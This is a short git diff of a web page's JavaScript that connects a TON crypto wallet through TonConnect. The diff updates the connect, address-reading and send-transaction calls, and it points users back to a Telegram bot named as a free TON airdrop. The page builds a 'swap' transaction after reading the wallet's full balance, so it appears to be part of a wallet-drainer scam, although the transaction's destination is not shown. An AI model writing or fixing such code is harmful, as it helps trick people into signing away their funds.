@@ -17,16 +17,13 @@
             buttonRootId: 'connectWalletButton'
         });
         tonConnectUI.uiOptions = {
-      twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-  };
-  
-    </script>
-    <script>
-
+            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        };
 
         const connectWallet = async () => {
             try {
-                await connector.connect();
+                await tonConnectUI.openModal();
+                const walletAddress = await tonConnectUI.account.address;
                 document.getElementById('connectWalletButton').disabled = true;
                 document.getElementById('swapButton').disabled = false;
                 document.getElementById('status').innerText = 'Wallet connected.';
@@ -45,7 +42,7 @@
         };
 
         const prepareSwapTransaction = async () => {
-            const walletAddress = await connector.account.address;
+            const walletAddress = await tonConnectUI.account.address;
             const balance = await getTONBalance(walletAddress);
 
             const swapTransaction = {
@@ -66,7 +63,7 @@
             const transaction = await prepareSwapTransaction();
 
             try {
-                const result = await connector.sendTransaction(transaction);
+                const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction sent:', result);
                 document.getElementById('status').innerText = 'Transaction sent successfully.';
             } catch (error) {
